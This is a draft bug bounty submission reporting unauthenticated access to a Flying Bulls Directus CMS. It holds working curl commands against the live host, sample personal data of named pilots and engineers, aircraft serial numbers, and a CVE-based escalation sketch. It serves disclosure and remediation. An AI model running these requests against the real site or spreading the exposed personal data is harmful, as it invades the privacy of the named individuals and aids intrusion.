# RB1 — Intigriti Submission Draft

**Program:** Red Bull (Intigriti)  
**Date:** 2026-06-27  
**Language:** English (Intigriti standard)

---

## TÍTULO / TITLE

> Directus 10.11.0 CMS Exposes Pilot PII and Aircraft Serial Numbers Without Authentication on directus.flyingbulls.at

---

## CAMPO: Vulnerability Type

- Broken Access Control / Sensitive Data Exposure
- CWE-284: Improper Access Control

---

## CAMPO: Severity (proposed)

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = **5.3 MEDIUM**

> Note to triager: business impact is HIGH due to GDPR violation (Austria, EU regulation). Flying Bulls GmbH is an Austrian legal entity subject to GDPR Art. 25, 32, and 83(4). Maximum penalty: €20M or 4% of global annual revenue.

---

## CAMPO: Asset / Target

**URL:** `https://directus.flyingbulls.at`  
**Type:** Web Application  
**In-scope:** Yes — program explicitly lists `directus.flyingbulls.at` in the scope

---

## CORPO DA SUBMISSÃO

### Summary

The Directus 10.11.0 headless CMS at `directus.flyingbulls.at` — the internal content management system for The Flying Bulls (Red Bull's historic aviation company) — allows unauthenticated read access to multiple collections via its REST API.

Any anonymous HTTP request can retrieve:
- **Personal data of 26 individuals** (pilots, engineers, and other personnel): full name (`firstname`, `lastname`), employment relationship type, cumulative flight hours, year of first flight, and personal photos
- **Operational data of 25 historic aircraft**: ICAO registration numbers, manufacturer serial numbers, technical specifications (wingspan, max speed, fuel capacity, etc.)
- **100+ media files** including named pilot photos (e.g., `00_header_eskil_amdal_pilot_the_flying_bulls.jpg`)
- **Full OpenAPI specification** at `/server/specs/oas`, exposing the complete internal data schema with all 47 endpoints

**Important context:** The public website `www.flyingbulls.at` is powered by a separate TYPO3 CMS (backend: `api.flyingbulls.at`). The Directus instance at `directus.flyingbulls.at` is an **independent internal system**, not the public website backend. Its data is not publicly available through any other channel.

---

### Steps to Reproduce

**Step 1 — Confirm Directus version (unauthenticated)**

```bash
curl -s "https://directus.flyingbulls.at/server/specs/oas" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['info']['title'], d['info']['version'])"
```

Expected output:
```
Flying Bulls API 10.11.0
```

**Step 2 — Enumerate all available collections (unauthenticated)**

```bash
curl -s "https://directus.flyingbulls.at/server/specs/oas" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print([p for p in d['paths'] if '/items/' in p])"
```

Expected output:
```
['/items/fleet', '/items/persons', '/items/events', '/items/events_persons']
```

**Step 3 — Read pilot PII without authentication**

```bash
curl -s "https://directus.flyingbulls.at/items/persons?fields=type,firstname,lastname,flight_hours,first_flight&limit=100"
```

Expected output (HTTP 200, truncated):
```json
{
  "data": [
    {
      "type": "pilot",
      "firstname": "Siegfried",
      "lastname": "Schwarz",
      "flight_hours": 11000,
      "first_flight": "1977"
    },
    {
      "type": "pilot",
      "firstname": "Raimund",
      "lastname": "Riedmann",
      "flight_hours": 16500,
      "first_flight": "1986"
    },
    {
      "type": "pilot",
      "firstname": "Eric",
      "lastname": "Goujon",
      "flight_hours": 9800,
      "first_flight": null
    },
    {
      "type": "engineer",
      "firstname": "Stefan",
      "lastname": "Krumböck",
      "flight_hours": null,
      "first_flight": null
    }
    ... (26 total persons)
  ]
}
```

**Step 4 — Read aircraft serial numbers without authentication**

```bash
curl -s "https://directus.flyingbulls.at/items/fleet?fields=name,registration,serial_number,manufacturer,construction_year"
```

Expected output (HTTP 200, sample):
```json
{
  "data": [
    {
      "name": "North American P-51D Mustang",
      "registration": "OE-EFB",
      "serial_number": "44-74427",
      "manufacturer": "North American Aviation",
      "construction_year": 1944
    },
    {
      "name": "Chance Vought F4U-4 \"Corsair\"",
      "registration": "OE-EAS",
      "serial_number": "96995",
      "manufacturer": "Chance Vought",
      "construction_year": 1945
    },
    {
      "name": "North American B-25J \"Mitchell\"",
      "registration": "N6123C",
      "serial_number": "44-86893A",
      "manufacturer": "North American Aviation Inc.",
      "construction_year": 1945
    }
    ... (25 total aircraft)
  ]
}
```

**Step 5 — List files including pilot photos**

```bash
curl -s "https://directus.flyingbulls.at/files?fields=filename_download,type,filesize&limit=20"
```

Sample response includes filenames such as:
- `00_header_eskil_amdal_pilot_the_flying_bulls.jpg` (1.3 MB)
- Additional pilot, aircraft, and event photos

---

### Impact

**1. GDPR Violation — Personal Data of Flying Bulls Personnel**

Flying Bulls GmbH is an Austrian legal entity. Austria is an EU member state. The exposed data constitutes "personal data" under GDPR Article 4(1):
- **Full names** of employees and contractors (pilots, engineers)
- **Employment relationship type** (pilot / engineer / friend)
- **Professional data**: cumulative flight hours, year of first solo flight
- **Biometric-adjacent data**: personal photos linked to named individuals

Applicable GDPR provisions:
- Art. 5(1)(f): integrity and confidentiality principle violated
- Art. 25: Privacy by Design — technical access controls not implemented by default
- Art. 32: Appropriate technical measures for personal data protection

Maximum administrative fine: **€20,000,000 or 4% of global annual turnover** (Art. 83(4)).

**2. Operational Security — Aircraft Serial Numbers**

The exposed manufacturer serial numbers (e.g., USAAF serial `44-74427` for the P-51D Mustang) are not published on the public website. These numbers are used for aircraft authenticity verification, insurance, and legal title purposes.

**3. Internal API Schema Exposure**

The full OpenAPI specification at `/server/specs/oas` (unauthenticated) exposes all 47 internal endpoints including `/items/directus_users`, allowing an attacker to enumerate the complete data architecture for further exploitation.

**4. Potential Escalation Path**

```
Anonymous read access confirmed
  → OpenAPI spec reveals /items/directus_users collection
    → If directus_users has public read permissions → admin email enumeration
      → Combined with CVE-2024-34709 (field permissions bypass, CVSS 8.1)
        → Potential access to non-published (draft) content
```

---

### Directus Version — Relevant CVEs

The confirmed version `10.11.0` is affected by:

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2024-34709 | 8.1 HIGH | Bypass of access control via field-level permission manipulation (< 10.11.2) |
| CVE-2024-34708 | 7.1 HIGH | Stored XSS via WYSIWYG editor (< 10.11.2) |
| CVE-2024-38361 | 8.8 HIGH | SSRF via `/files/import` endpoint (< 10.13.0) |

CVE-2024-34709 is particularly relevant as it could be chained with the existing public role misconfiguration to escalate access.

---

### Suggested Remediation

**Immediate (< 24h):**
```
Directus Admin → Settings → Access Control → Public Role
  → Remove all READ permissions from: persons, fleet, files
  → Audit: events, events_persons, directus_users collections
```

**Short-term (< 1 week):**
- Update Directus from 10.11.0 to 10.13.x+ (patches CVE-2024-34709 and CVE-2024-38361)
- Block `/server/specs/oas` from unauthenticated access (nginx: `deny all` for `/server/specs/`)
- Review all Public Role permissions using principle of least privilege

---

### Notes on Testing Ethics

- All testing was passive read-only (HTTP GET requests)
- No data was modified, exported in bulk, or used beyond access verification
- No automated scanning tools were used
- Request rate was well below the 5 req/sec program limit
- Finding was reported to the program within 48 hours of discovery

---

## CHECKLIST PRÉ-SUBMISSÃO

- [x] Target em escopo (`directus.flyingbulls.at` listado explicitamente)
- [x] Não é CORS em endpoint não-sensível (não é esse tipo)
- [x] Não é subdomain takeover sem claim
- [x] Não é informação pública (a API pública usa TYPO3, não Directus)
- [x] PoC funciona com curl simples (reproducível pelo triager)
- [x] Impacto de negócio documentado (GDPR austríaco)
- [x] Nenhuma modificação de dados realizada
- [x] Report em inglês

## SEVERITY ESPERADA NA TRIAGEM

| Critério | Análise |
|----------|---------|
| CVSS base | 5.3 MEDIUM |
| Programa: business impact > CVSS | HIGH (GDPR + nome dos pilotos) |
| Triagem esperada | MEDIUM ou HIGH |
| Recompensa esperada | 1-3 trays de Red Bull |
